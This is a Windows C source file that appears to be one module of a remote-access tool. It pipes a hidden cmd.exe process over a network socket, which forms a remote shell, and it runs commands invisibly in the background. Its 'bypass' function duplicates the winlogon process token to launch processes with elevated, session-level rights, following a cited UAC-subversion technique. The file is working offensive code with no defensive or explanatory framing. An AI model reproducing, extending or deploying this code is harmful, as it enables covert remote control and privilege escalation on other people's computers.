#include <stdio.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <wtsapi32.h>
//#include <userenv.h> // -luserenv
#include "main.h"
#include "cry_socket.h"

static HANDLE g_hChildStd_OUT_Rd = NULL;
static HANDLE g_hChildStd_OUT_Wr = NULL;
static HANDLE g_hChildStd_IN_Rd  = NULL;
static HANDLE g_hChildStd_IN_Wr  = NULL;

static HANDLE thread_send = NULL;
static HANDLE thread_recv = NULL;

static DWORD WINAPI runProc_thread_r(void* data) {
	while (TRUE) {
		DWORD read;
		char buff[BIGSIZ] = {0};
		BOOL ret = ReadFile(g_hChildStd_OUT_Rd, buff, BIGSIZ, &read, NULL);
		if (!ret || read == 0) { break; }
		sendE(*((SOCKET*)data), buff, read, 0);
	}
	
	// kill the other thread
	TerminateThread(thread_recv, 0);
	return 1;
}

static DWORD WINAPI runProc_thread_w(void* data) {
	char buff[BIGSIZ] = {0};
	while (TRUE) {
		int r = recvE(*((SOCKET*)data), buff, BIGSIZ, 0);
		if (r == SOCKET_ERROR || r == 0) { break; } // close the connection to kill the process
		if (r > 0) { if (!WriteFile(g_hChildStd_IN_Wr, buff, r, NULL, NULL)) { break; } }
	}
	
	// kill the other thread
	TerminateThread(thread_send, 0);
	return 1;
}

int runProc(SOCKET sock, char* cmd) {
	
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	if (!CreatePipe          (&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0)) { return 0; }
	if (!SetHandleInformation( g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT,      0)) { return 0; }
	if (!CreatePipe          (&g_hChildStd_IN_Rd,  &g_hChildStd_IN_Wr,  &sa, 0)) { return 0; }
	if (!SetHandleInformation( g_hChildStd_IN_Wr,  HANDLE_FLAG_INHERIT,      0)) { return 0; } 
	
	// create process
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.hStdError  = g_hChildStd_OUT_Wr;
	si.hStdOutput = g_hChildStd_OUT_Wr;
	si.hStdInput  = g_hChildStd_IN_Rd;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	/* <-- uncomment to remove parent env inheritance
	LPVOID env_block;
	if (!CreateEnvironmentBlock(&env_block, NULL, FALSE)) {
		D(printf("No CreateEnvironmentBlock. Error: %ld\n", GetLastError()));
	}
	if (!CreateProcess(NULL, cmdc, NULL, NULL, TRUE, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, env_block, NULL, &si, &pi)) { return 0; }
	//*/ if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { return 0; }

	CloseHandle(g_hChildStd_OUT_Wr);
	CloseHandle(g_hChildStd_IN_Rd);
	
	// start recv thread
	thread_send = CreateThread(NULL, 0, runProc_thread_r, (void*)&sock, 0, NULL); if (!thread_send) { return 0; }
	thread_recv = CreateThread(NULL, 0, runProc_thread_w, (void*)&sock, 0, NULL); if (!thread_recv) { return 0; }
	
	// wait for the threads to finish/kill each other
	WaitForSingleObject(thread_send, INFINITE);
	WaitForSingleObject(thread_recv, INFINITE);
	
	// close all the handles
	CloseHandle(g_hChildStd_IN_Wr); // stop child from reading

	// get exit code
	DWORD exit_code;
	GetExitCodeProcess(pi.hProcess, &exit_code);
	
	// kill process and close
	TerminateProcess(pi.hProcess, 0);
	CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
	
	// send errorlevel value
	int l = strlen(cmd) + 256;
	char* newBuff = (char*)calloc(l, sizeof(char));
	snprintf(newBuff, l, "\n: \"%s\" -> \"%lu\"\n\n", cmd, exit_code);
	sendE(sock, newBuff, strlen(newBuff), 0);
	free(newBuff);
	
	return 1;
}

int runProc_bg(char* cmd) {
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	int r = CreateProcess(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (r == 0) { return 0; }
	CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
	return 1;
}

int runCMD(SOCKET sock, const char* cmd) {
	int l = strlen(cmd) + 64;
	char* newBuff = (char*)calloc(l, sizeof(char));
	snprintf(newBuff, l, "cmd.exe /c \"%s\"", cmd);
	int r = runProc(sock, newBuff);
	free(newBuff);
	return r;
}

int runCMD_bg(const char* cmd) {
	int l = strlen(cmd) + 64;
	char* newBuff = (char*)calloc(l, sizeof(char));
	snprintf(newBuff, l, "cmd.exe /c \"%s\"", cmd);
	int r = runProc_bg(newBuff);
	free(newBuff);
	return r;
}

int bypass(SOCKET sock, char* cmd) {
	
	// sauce: https://www.codeproject.com/Articles/35773/Subverting-Vista-UAC-in-Both-32-and-64-bit-Archite
	
	DWORD winlogonPid = 0;
	
	// obtain the currently active session id; every logged on user in the system has a unique session id
	DWORD dwSessionID = WTSGetActiveConsoleSessionId();
	
	// obtain the process id of the winlogon process that is running within the currently active session
	HANDLE thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (thSnapShot == INVALID_HANDLE_VALUE) {
		char msg[] = "CreateToolhelp32Snapshot failed\n";
		sendE(sock, msg, strlen(msg), 0);
		return 0;
	}
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	BOOL retval = Process32First(thSnapShot, &pe);
	while (retval) {
		
		DWORD SessionId;
		if (StrStrI(pe.szExeFile, "winlogon") != NULL && ProcessIdToSessionId(pe.th32ProcessID, &SessionId) && SessionId == dwSessionID)
		{ winlogonPid = pe.th32ProcessID;; }
		
		retval = Process32Next(thSnapShot, &pe);
	}
	CloseHandle(thSnapShot);
	
	// obtain a handle to the winlogon process
	HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, winlogonPid);
	
	// obtain a handle to the access token of the winlogon process
	HANDLE hPToken;
	if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hPToken)) {
		char msg[] = "OpenProcessToken failed\n";
		sendE(sock, msg, strlen(msg), 0);
		CloseHandle(hProcess);
		return FALSE;
	}
	
	// copy the access token of the winlogon process; the newly created token will be a primary token
	HANDLE hUserTokenDup;
    if (!DuplicateTokenEx(hPToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hUserTokenDup)) {
		char msg[] = "DuplicateTokenEx failed\n";
		sendE(sock, msg, strlen(msg), 0);
        CloseHandle(hProcess);
        CloseHandle(hPToken);
        return FALSE;
    }
	
	// By default CreateProcessAsUser creates a process on a non-interactive window station, meaning
	// the window station has a desktop that is invisible and the process is incapable of receiving
	// user input. To remedy this we set the lpDesktop parameter to indicate we want to enable user 
	// interaction with the new process.
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = "winsta0\\default"; // interactive window station parameter; basically this indicates that the process created can display a GUI on the desktop
	
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	
	// create a new process in the current user's logon session
	BOOL result = CreateProcessAsUser(
		hUserTokenDup,                              // client's access token
		NULL,                                       // file to execute
		cmd,                                        // command line
		NULL,                                       // pointer to process SECURITY_ATTRIBUTES
		NULL,                                       // pointer to thread SECURITY_ATTRIBUTES
		FALSE,                                      // handles are not inheritable
		NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, // creation flags
		NULL,                                       // pointer to new environment block 
		NULL,                                       // name of current directory 
		&si,                                        // pointer to STARTUPINFO structure
		&pi                                         // receives information about new process
	);
	
	// invalidate the handles
	CloseHandle(hProcess);
	CloseHandle(hPToken);
	CloseHandle(hUserTokenDup);
	
	if (!result) {
		char msg[] = "CreateProcessAsUser failed\n";
		sendE(sock, msg, strlen(msg), 0);
	}
	
	return result;
}